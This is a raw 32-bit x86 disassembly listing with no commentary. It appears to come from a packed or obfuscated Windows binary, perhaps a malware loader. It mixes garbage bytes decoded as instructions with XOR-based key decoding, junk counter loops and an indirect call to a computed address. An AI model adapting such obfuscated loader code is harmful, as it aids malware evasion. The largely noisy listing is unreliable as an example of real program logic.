  406226:	stos   BYTE PTR es:[edi],al
  406227:	lods   al,BYTE PTR ds:[esi]
  406228:	dec    eax
  406229:	aaa    
  40622a:	int3   
  40622b:	sub    al,0xab
  40622d:	aad    0x8d
  40622f:	faddp  st(4),st
  406231:	lds    edx,FWORD PTR [edx]
  406233:	pop    ss
  406234:	mov    eax,0x66dca1f4
  406239:	inc    ebp
  40623a:	pop    edx
  40623b:	mov    ah,BYTE PTR [ebx+eax*4]
  40623e:	add    al,0xe5
  406240:	xchg   DWORD PTR [eax],edi
  406242:	or     al,0x5e
  406244:	ins    BYTE PTR es:[edi],dx
  406245:	push   eax
  406246:	mov    al,0xf9
  406248:	cmp    BYTE PTR [esi+ebx*1+0x13],dl
  40624c:	push   es
  40624d:	(bad)
  406251:	mov    eax,ds:0xbe6e7850
  406256:	inc    DWORD PTR cs:[eax+0x60d63942]
  40625d:	mov    ebx,0x1a441d10
  406262:	pop    ecx
  406263:	mov    bl,0x33
  406265:	lock and DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	pop    es
  406312:	(bad)  
  406313:	es pop edi
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	pop    ds
  40631e:	dec    esi
  40631f:	retf   
  406320:	inc    ebp
  406321:	data16 mov ds:0xb6641089,al
  406327:	adc    ebp,ecx
  406329:	sub    dl,al
  40632b:	push   ecx
  40632d:	or     eax,0xe70dcf9a
  406332:	cmp    eax,0x1371ed
  406337:	sub    edi,esp
  406339:	add    eax,0x661b904b
  40633e:	adc    ch,BYTE PTR [ebx+0x2f]
  406341:	fnsave [edi]
  406343:	outs   dx,DWORD PTR ds:[esi]
  406344:	add    ebx,esp
  406346:	lahf   
  406347:	jno    0x40637d
  406349:	bound  ebx,QWORD PTR [eax]
  40634b:	jne    0x40638b
  40634d:	adc    ebx,eax
  40634f:	sub    BYTE PTR [ecx+0xb4e4e61],0xbd
  406356:	add    BYTE PTR [edi],al
  406358:	cmc    
  406359:	push   esi
  40635a:	(bad)  
  40635b:	fbstp  TBYTE PTR [edx]
  40635d:	rol    BYTE PTR [ecx],cl
  40635f:	fisub  WORD PTR [ecx-0x17c36aee]
  406365:	inc    ebp
  406366:	or     ebp,DWORD PTR [eax+0x15ca724d]
  40636c:	pop    esp
  40636d:	push   ebp
  40636e:	mov    bl,0xbd
  406370:	xchg   ecx,eax
  406371:	data16 test al,0x90
  406374:	sbb    DWORD PTR [eax+ecx*2-0x3e4829c8],ebp
  40637b:	mov    BYTE PTR [esi],ah
  40637d:	ss (bad) 
  40637f:	jge    0x4063c5
  406381:	xchg   edx,eax
  406382:	addr16 push 0x4cc6caec
  406388:	push   ds
  406389:	jno    0x4063ca
  40638b:	dec    ebx
  40638c:	jge    0x406318
  40638e:	pop    es
  40638f:	mov    edx,0x74a56c10
  406394:	ins    BYTE PTR es:[edi],dx
  406395:	or     DWORD PTR [esi+ecx*8-0x52],ecx
  406399:	add    dl,BYTE PTR [edi-0x6747ed53]
  40639f:	pop    edx
  4063a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a1:	sahf   
  4063a2:	cmp    DWORD PTR [ebx+ebx*4+0x3e5204d0],edx
  4063a9:	mov    WORD PTR [eax+0x5],?
  4063ac:	lods   eax,DWORD PTR ds:[esi]
  4063ad:	mov    ?,WORD PTR [eax-0x43e70ecc]
  4063b3:	shl    BYTE PTR [ecx+ecx*1+0x5b4a274f],1
  4063ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063bb:	gs mov ebp,0xf7a155c2
  4063c1:	sbb    esp,DWORD PTR [ebx-0x43af0b05]
  4063c7:	les    edi,FWORD PTR [eax+0x56deb015]
  4063cd:	mov    ch,0x5c
  4063cf:	leave  
  4063d0:	sbb    ch,ch
  4063d2:	lds    ebx,FWORD PTR [eax]
  4063d4:	loope  0x406442
  4063d6:	cld    
  4063d7:	aad    0x40
  4063d9:	aad    0x2b
  4063db:	cmp    edx,eax
  4063dd:	adc    esi,edi
  4063df:	lea    esi,ds:0x99813d99
  4063e5:	lock sahf 
  4063e7:	iret   
  4063e8:	mov    dl,0xcd
  4063ea:	into   
  4063eb:	cmp    edi,edx
  4063ed:	cmc    
  4063ee:	popa   
  4063ef:	dec    ebx
  4063f0:	pop    edx
  4063f1:	in     al,0x69
  4063f3:	hlt    
  4063f4:	cmc    
  4063f5:	fs stos DWORD PTR es:[edi],eax
  4063f7:	jge    0x40644c
  4063f9:	pushf  
  4063fa:	dec    edi
  4063fb:	pushf  
  4063fc:	inc    ebx
  4063fd:	scas   eax,DWORD PTR es:[edi]
  4063fe:	jns    0x406455
  406400:	lock push edx
  406402:	fcom   DWORD PTR [ebx+0x6b0b0dc6]
  406408:	call   0x4933:0x26d6b527
  40640f:	adc    al,0x76
  406411:	pop    ss
  406412:	dec    ebp
  406413:	mov    edx,0xbf41672d
  406418:	out    0x3b,eax
  40641a:	sti    
  40641b:	retf   0x5e1f
  40641e:	aaa    
  40641f:	mov    esi,0xbee68be9
  406424:	adc    DWORD PTR [esp+edi*4-0x5c],ecx
  406428:	frstor [edi-0x46]
  40642b:	jns    0x40647b
  40642d:	cs in  eax,0xe7
  406430:	push   edi
  406431:	sti    
  406432:	pop    edi
  406433:	stos   DWORD PTR es:[edi],eax
  406434:	dec    ebx
  406435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406436:	adc    eax,0xde432190
  40643b:	mov    edx,0xdd7ae979
  406440:	pusha  
  406441:	xor    eax,0x46e312f5
  406446:	cmp    ch,ah
  406448:	sub    al,0xe9
  40644a:	pop    ss
  40644b:	idiv   BYTE PTR [ebx-0x6e]
  40644e:	push   edx
  40644f:	aas    
  406450:	pop    edx
  406451:	pop    es
  406452:	push   ds
  406453:	cmp    dh,BYTE PTR [ebp-0x225601c0]
  406459:	jb     0x40642a
  40645b:	jmp    0x9042:0x81fd69a9
  406462:	je     0x406444
  406464:	test   eax,0x9c3059d
  406469:	cli    
  40646a:	jno    0x406432
  40646c:	and    al,dl
  40646e:	jmp    0x4063f8
  406470:	hlt    
  406471:	dec    esi
  406472:	lea    edi,[edi-0x190e075a]
  406478:	(bad)  
  406479:	mov    eax,0xdfcc7b94
  40647e:	sub    al,0x9a
  406480:	xchg   esp,eax
  406481:	push   edx
  406482:	popf   
  406483:	sahf   
  406484:	and    eax,DWORD PTR [eax-0x3d]
  406487:	fwait
  406488:	add    BYTE PTR [eax],ch
  40648a:	aad    0xac
  40648c:	inc    esi
  40648d:	xor    BYTE PTR ds:0xaad1bac4,al
  406493:	cmp    al,0xbd
  406495:	fwait
  406496:	push   esi
  406497:	retf   0x945e
  40649a:	inc    edx
  40649b:	jbe    0x40650a
  40649d:	imul   edx,DWORD PTR [ecx-0x3239994],0x517a15b1
  4064a7:	int3   
  4064a8:	jne    0x4064cb
  4064aa:	pop    es
  4064ab:	and    BYTE PTR [edi+0x45],cl
  4064ae:	test   al,0xda
  4064b0:	dec    eax
  4064b1:	lods   al,BYTE PTR ds:[esi]
  4064b2:	xchg   esi,eax
  4064b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064b4:	test   BYTE PTR [ebp-0x11],0xa9
  4064b8:	fwait
  4064b9:	out    dx,eax
  4064ba:	repnz jecxz 0x406505
  4064bd:	retf   
  4064be:	jl     0x406520
  4064c0:	shr    edi,1
  4064c2:	or     BYTE PTR [eax-0x25],0x30
  4064c6:	xor    BYTE PTR [esi+0x41],dh
  4064c9:	pushf  
  4064ca:	shl    edi,cl
  4064cc:	push   0x1046355d
  4064d1:	les    edi,FWORD PTR [eax+0x4b]
  4064d4:	in     eax,dx
  4064d5:	and    dl,BYTE PTR [edi+0x3c6ba1f3]
  4064db:	inc    ebp
  4064dc:	dec    ebx
  4064dd:	push   edi
  4064de:	or     bh,al
  4064e0:	xchg   edx,eax
  4064e1:	mov    bl,0xe4
  4064e3:	and    ah,bh
  4064e5:	jge    0x406474
  4064e7:	dec    ebp
  4064e8:	pop    es
  4064e9:	and    DWORD PTR [edx+0x36],ebp
  4064ec:	fsub   st(2),st
  4064ee:	or     bl,BYTE PTR [ecx]
  4064f0:	mov    bh,0xf3
  4064f2:	shl    BYTE PTR [edx],1
  4064f4:	inc    eax
  4064f5:	cli    
  4064f6:	xchg   DWORD PTR [ecx+0x66],esp
  4064f9:	rol    esp,1
  4064fb:	sti    
  4064fc:	mov    WORD PTR [esi-0x22e0f8da],ss
  406502:	aad    0xcd
  406504:	loope  0x406514
  406506:	out    0x1,al
  406508:	rcr    DWORD PTR [esi+0x280283ce],0x5f
  40650f:	mov    ebx,0x51156477
  406514:	lds    esp,FWORD PTR [esi-0x607617b9]
  40651a:	sub    dl,BYTE PTR [eax-0x11]
  40651d:	(bad)  
  40651f:	mov    edx,0xc273e32
  406524:	sbb    DWORD PTR [esp+edx*2],ecx
  406527:	addr16 sti 
  406529:	inc    eax
  40652a:	out    dx,eax
  40652b:	sub    dh,BYTE PTR [ebx]
  40652d:	(bad)  
  406530:	mov    ecx,0x6c3a669d
  406535:	jmp    0xcc02:0x887383a4
  40653c:	lahf   
  40653d:	push   ebx
  40653e:	popa   
  40653f:	cld    
  406540:	inc    ebx
  406541:	sub    al,0x39
  406543:	push   esi
  406544:	cld    
  406545:	dec    ebp
  406546:	or     eax,DWORD PTR [edx+0x44bf8a]
  40654c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40654d:	jmp    0xc98cf19f
  406552:	sbb    BYTE PTR [esi+edi*2+0x348ec2a9],0x6
  40655a:	adc    ebp,esp
  40655c:	fbstp  TBYTE PTR [esi+0x67]
  40655f:	xchg   DWORD PTR [ecx+0x2fa3d56f],esi
  406565:	int3   
  406566:	out    0xde,al
  406568:	loope  0x406571
  40656a:	sub    al,0x94
  40656c:	inc    ebx
  40656d:	test   BYTE PTR [edx+0x29b9cbd0],0x59
  406574:	pop    edx
  406575:	fmul   DWORD PTR [edx]
  406577:	cmp    ebp,0xfbf4901d
  40657d:	ficom  DWORD PTR [esp+ebp*2]
  406580:	fisubr DWORD PTR [eax-0x4f]
  406583:	mov    eax,ds:0xb12429ec
  406588:	pusha  
  406589:	xor    DWORD PTR [ebx],ebx
  40658b:	dec    ecx
  40658c:	jg     0x4065f8
  40658e:	and    BYTE PTR [esi-0x7e],al
  406591:	mov    bh,BYTE PTR [eax]
  406593:	aad    0xd9
  406595:	mov    al,ds:0xf7db562
  40659a:	out    dx,eax
  40659b:	retf   
  40659c:	loopne 0x40657f
  40659e:	mov    dh,0x5
  4065a0:	and    eax,0x6fa132a
  4065a5:	retf   
  4065a6:	cmp    dl,BYTE PTR [ebp-0x29]
  4065a9:	jmp    0x4065e4
  4065ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ac:	mov    ch,0xec
  4065ae:	cmp    eax,0xd22f7958
  4065b3:	mov    bh,0xff
  4065b5:	mov    eax,ds:0x3b1034c
  4065ba:	push   edx
  4065bb:	adc    esp,ebx
  4065bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065be:	dec    edx
  4065bf:	lea    esp,[esi]
  4065c1:	js     0x406576
  4065c3:	adc    dl,ah
  4065c5:	push   ss
  4065c6:	or     eax,0xef2480c9
  4065cb:	retf   
  4065cc:	les    esp,FWORD PTR [eax+esi*1-0x52]
  4065d0:	jns    0x4065a2
  4065d2:	(bad)  
  4065d3:	fst    st(2)
  4065d5:	jbe    0x406633
  4065d7:	push   edi
  4065d8:	fsubr  DWORD PTR [edx+esi*4+0x683d219d]
  4065df:	in     al,0xaa
  4065e1:	and    al,0xe8
  4065e3:	sbb    eax,0xb6e53abf
  4065e8:	push   esi
  4065e9:	sub    BYTE PTR [eax-0x5f1bf7c3],bl
  4065ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065f0:	cli    
  4065f1:	cmp    ah,ah
  4065f3:	jno    0x4065b7
  4065f5:	and    eax,0xbb69ef0b
  4065fa:	lock adc esi,DWORD PTR ss:[esi+esi*1+0x530d8df0]
  406603:	mov    ch,BYTE PTR [esi-0x29d3d971]
  406609:	and    eax,0x85f3e13d
  40660e:	adc    eax,0x30c7705f
  406613:	jnp    0x4065fe
  406615:	push   ss
  406616:	in     al,0x8a
  406618:	jbe    0x40666a
  40661a:	sbb    esp,DWORD PTR [esi+0x4b76a89d]
  406620:	fcmovbe st,st(6)
  406622:	xchg   edx,eax
  406623:	mov    eax,0x93022606
  406628:	sbb    al,0x29
  40662a:	dec    esp
  40662b:	push   eax
  40662c:	aam    0x3c
  40662e:	xor    cl,BYTE PTR [esi-0x35ecc8cb]
  406634:	pop    esi
  406635:	bound  esi,QWORD PTR [ebx+0x2e]
  406638:	sti    
  406639:	fsubr  DWORD PTR [edi]
  40663b:	cmp    eax,0xfeb26a01
  406640:	add    edx,esp
  406642:	loop   0x4066bb
  406644:	pop    eax
  406645:	jb     0x406669
  406647:	iret   
  406648:	jle    0x406641
  40664a:	add    al,BYTE PTR [ebp+0x20]
  40664d:	mov    ebp,es
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x292b7f5f
  406b85:	data16 add bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x967e7e7f
  406b8f:	ret    
  406b90:	stos   DWORD PTR es:[edi],eax
  406b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b92:	test   ch,bh
  406b94:	jno    0x406bf3
  406b96:	xchg   DWORD PTR [esi-0x36],esi
  406b99:	je     0x406bbc
  406b9b:	imul   edx,edx,0x21a467ac
  406ba1:	jno    0x406bb8
  406ba3:	test   eax,0xb2d64a77
  406ba8:	in     al,0xd2
  406baa:	mov    bl,0xea
  406bac:	push   ebx
  406bad:	(bad)  
  406bae:	xlat   BYTE PTR ds:[ebx]
  406baf:	or     bl,BYTE PTR [eax-0x40]
  406bb2:	pop    edx
  406bb3:	adc    al,0xbb
  406bb5:	jl     0x406b3d
  406bb7:	stc    
  406bb8:	in     eax,0xd2
  406bba:	clc    
  406bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bbc:	jne    0x406b90
  406bbe:	shl    BYTE PTR [eax+0x7c],cl
  406bc1:	push   esp
  406bc2:	xchg   esi,eax
  406bc3:	out    dx,eax
  406bc4:	dec    eax
  406bc5:	adc    DWORD PTR [ebx],0x19956d8f
  406bcb:	aaa    
  406bcc:	mov    ds:0x8359f78e,eax
  406bd1:	add    al,0xef
  406bd3:	nop
  406bd4:	xchg   ebp,eax
  406bd5:	and    dh,bl
  406bd7:	pop    ebp
  406bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bd9:	jmp    0xffdc:0x41e3d7c0
  406be0:	std    
  406be1:	call   FWORD PTR [esp+edx*4-0xf]
  406be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
